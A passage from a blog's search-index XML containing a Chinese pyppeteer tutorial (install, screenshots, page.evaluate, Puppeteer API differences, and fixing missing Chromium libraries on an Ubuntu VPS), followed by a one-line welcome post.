class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install pyppeteer</span><br></pre></td></tr></table></figure><h2 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2. 基本使用"></a>2. 基本使用</h2><p>note: 第一次运行pyppeteer会下载当前最新版本的Chromium</p><p>Ex1: 打开一个网站并截图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="comment"># 声明一个浏览器</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch()</span><br><span class="line"><span class="comment"># 打开一个新的标签页</span></span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;example.png&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><p>Ex2: 在页面中执行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    browser = <span class="keyword">await</span> launch()</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;example.png&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    dimensions = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;&#x27;&#x27;() =&gt; &#123;</span></span><br><span class="line"><span class="string">        return &#123;</span></span><br><span class="line"><span class="string">            width: document.documentElement.clientWidth,</span></span><br><span class="line"><span class="string">            height: document.documentElement.clientHeight,</span></span><br><span class="line"><span class="string">            deviceScaleFactor: window.devicePixelRatio,</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dimensions)</span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; &#123;&#x27;width&#x27;: 800, &#x27;height&#x27;: 600, &#x27;deviceScaleFactor&#x27;: 1&#125;</span></span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><h2 id="3-puppeteer和pyppeteer差异点"><a href="#3-puppeteer和pyppeteer差异点" class="headerlink" title="3. puppeteer和pyppeteer差异点"></a>3. <strong>puppeteer和pyppeteer差异点</strong></h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>Puppeteer 使用对象（python 中的字典）将选项传递给函数&#x2F;方法。 Pyppeteer 接受选项的字典和关键字参数。</p><p>字典形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;headless&#x27;</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure><p>参数形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = <span class="keyword">await</span> launch(headless=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="Element-selector-方法名-→-querySelector"><a href="#Element-selector-方法名-→-querySelector" class="headerlink" title="Element selector 方法名 ($→ querySelector)"></a><strong>Element selector 方法名 ($→ querySelector)</strong></h3><p>在python中$是不能作为方法名的。Pyppeteer使用<code>Page.querySelector()</code>&#x2F;<code>Page.querySelectorAll()</code>&#x2F;<code>Page.xpath()</code>代替<br><code>Page.$()</code>&#x2F;<code>Page.$$()</code>&#x2F;<code>Page.$x()</code> Pyppeteer也支持这些方法的缩写<code>Page.J()</code>&#x2F;<code>Page.JJ()</code> &#x2F;<code>Page.Jx()</code></p><h3 id="Page-evaluate-andPage-querySelectorEval-的参数"><a href="#Page-evaluate-andPage-querySelectorEval-的参数" class="headerlink" title="Page.evaluate()andPage.querySelectorEval() 的参数"></a><strong><code>Page.evaluate()</code>and<code>Page.querySelectorEval()</code> 的参数</strong></h3><p>Puppeteer 的 evaluate() 采用 JavaScript 原始函数或 JavaScript 表达式字符串，但 pyppeteer 采用 JavaScript 字符串。<br>JavaScript 字符串可以是函数或表达式。 Pyppeteer 尝试自动检测字符串是函数还是表达式，但有时会失败。 如果表达式字符串被视为函数并引发错误，则添加<br>force_expr&#x3D;True 选项，强制 pyppeteer 将字符串视为表达式。</p><p>Ex1: 获取网页内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;document.body.textContent&#x27;</span>, force_expr=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>Ex2: 获取元素文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = <span class="keyword">await</span> page.querySelector(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">title = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;(element) =&gt; element.textContent&#x27;</span>, element)</span><br></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="在-ubuntu-vps运行报错"><a href="#在-ubuntu-vps运行报错" class="headerlink" title="在 ubuntu vps运行报错"></a>在 ubuntu vps运行报错</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">165</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    run_browser(width, height)</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">159</span>, <span class="keyword">in</span> run_browser</span><br><span class="line">    <span class="keyword">return</span> asyncio.get_event_loop().run_until_complete(main(width, height))</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.8/asyncio/base_events.py&quot;</span>, line <span class="number">616</span>, <span class="keyword">in</span> run_until_complete</span><br><span class="line">    <span class="keyword">return</span> future.result()</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">62</span>, <span class="keyword">in</span> main</span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;headless&#x27;</span>: <span class="literal">True</span>,<span class="comment"># 可以无头</span></span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">307</span>, <span class="keyword">in</span> launch</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> Launcher(options, **kwargs).launch()</span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">168</span>, <span class="keyword">in</span> launch</span><br><span class="line">    <span class="variable language_">self</span>.browserWSEndpoint = get_ws_endpoint(<span class="variable language_">self</span>.url)</span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">227</span>, <span class="keyword">in</span> get_ws_endpoint</span><br><span class="line">    <span class="keyword">raise</span> BrowserError(<span class="string">&#x27;Browser closed unexpectedly:\n&#x27;</span>)</span><br><span class="line">pyppeteer.errors.BrowserError: Browser closed unexpectedly:</span><br></pre></td></tr></table></figure><p>首先有可能是环境缺少依赖，通过<code>ldd chrome | grep not</code> 在linux机器上查看缺少的依赖。</p><p>Debian</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ca-certificates</span><br><span class="line">fonts-liberation</span><br><span class="line">libappindicator3-<span class="number">1</span></span><br><span class="line">libasound2</span><br><span class="line">libatk-bridge2<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libatk1<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libc6</span><br><span class="line">libcairo2</span><br><span class="line">libcups2</span><br><span class="line">libdbus-<span class="number">1</span>-<span class="number">3</span></span><br><span class="line">libexpat1</span><br><span class="line">libfontconfig1</span><br><span class="line">libgbm1</span><br><span class="line">libgcc1</span><br><span class="line">libglib2<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libgtk-<span class="number">3</span>-<span class="number">0</span></span><br><span class="line">libnspr4</span><br><span class="line">libnss3</span><br><span class="line">libpango-<span class="number">1.0</span>-<span class="number">0</span></span><br><span class="line">libpangocairo-<span class="number">1.0</span>-<span class="number">0</span></span><br><span class="line">libstdc++<span class="number">6</span></span><br><span class="line">libx11-<span class="number">6</span></span><br><span class="line">libx11-xcb1</span><br><span class="line">libxcb1</span><br><span class="line">libxcomposite1</span><br><span class="line">libxcursor1</span><br><span class="line">libxdamage1</span><br><span class="line">libxext6</span><br><span class="line">libxfixes3</span><br><span class="line">libxi6</span><br><span class="line">libxrandr2</span><br><span class="line">libxrender1</span><br><span class="line">libxss1</span><br><span class="line">libxtst6</span><br><span class="line">lsb-release</span><br><span class="line">wget</span><br><span class="line">xdg-utils</span><br></pre></td></tr></table></figure><p>VPS上执行的结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-<span class="number">12</span>-<span class="number">12</span>-ubuntu:~/qcc_headless_restful$ ldd /home/ubuntu/.local/share/pyppeteer/local-chromium/<span class="number">588429</span>/chrome-linux/chrome | grep <span class="keyword">not</span> | awk &#123;<span class="string">&quot;print $1&quot;</span>&#125;</span><br><span class="line">libXss.so<span class="number">.1</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libpangocairo-<span class="number">1.0</span>.so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgtk-<span class="number">3.</span>so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgdk-<span class="number">3.</span>so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgdk_pixbuf-<span class="number">2.0</span>.so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to intbjw’s blog</title>
      <link href="/2020/02/25/Welcome%20to%20intbjw%E2%80%99s%20blog/"/>
      <url>/2020/02/25/Welcome%20to%20intbjw%E2%80%99s%20blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Welcome-to-intbjw’s-blog"><a href="#Welcome-to-intbjw’s-blog" class="headerlink" title="Welcome to intbjw’s blog"></a>Welcome to intbjw’s blog</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Announcement </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
